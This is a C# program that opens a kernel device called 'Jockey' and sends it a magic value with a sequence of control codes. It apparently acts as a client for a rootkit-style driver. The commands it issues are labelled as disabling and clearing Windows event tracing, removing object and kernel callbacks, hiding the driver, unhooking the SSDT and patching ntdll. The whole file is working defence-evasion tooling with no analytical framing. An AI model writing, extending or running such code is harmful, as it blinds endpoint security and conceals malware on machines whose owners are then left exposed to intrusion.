using System;
using System.Runtime.InteropServices;

public class T4 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string f, uint a, uint s, IntPtr sa, uint c, uint fl, IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(IntPtr h, uint c, byte[] i, uint il, byte[] o, uint ol, out uint r, IntPtr p);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);

    public static int Run() {
        IntPtr h = CreateFile(@"\\.\Jockey", 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if ((long)h == -1) { Console.WriteLine("open fail: " + Marshal.GetLastWin32Error()); return 1; }
        uint r = 0;
        byte[] magic = { 0x59, 0x4B, 0x4A, 0x00 };
        byte[] outb = new byte[256];

        bool ok = DeviceIoControl(h, 0x8000201C, magic, 4, outb, 4, out r, IntPtr.Zero);
        Console.WriteLine("DISABLE_ETW:   " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        ok = DeviceIoControl(h, 0x80002020, magic, 4, outb, 4, out r, IntPtr.Zero);
        Console.WriteLine("DISABLE_OB_CB: " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        ok = DeviceIoControl(h, 0x80002024, magic, 4, outb, 4, out r, IntPtr.Zero);
        Console.WriteLine("HIDE_DRIVER:   " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        ok = DeviceIoControl(h, 0x8000202C, magic, 4, outb, 4, out r, IntPtr.Zero);
        Console.WriteLine("DISABLE_CB:    " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        ok = DeviceIoControl(h, 0x80002038, magic, 4, outb, 4, out r, IntPtr.Zero);
        Console.WriteLine("CLEAR_ETW:     " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        ok = DeviceIoControl(h, 0x80002048, magic, 4, outb, 4, out r, IntPtr.Zero);
        Console.WriteLine("UNHOOK_SSDT:   " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        ok = DeviceIoControl(h, 0x8000204C, magic, 4, outb, 4, out r, IntPtr.Zero);
        Console.WriteLine("PATCH_NTDLL:   " + (ok ? "OK" : "FAIL") + " err=" + Marshal.GetLastWin32Error());

        CloseHandle(h);
        return 0;
    }
}
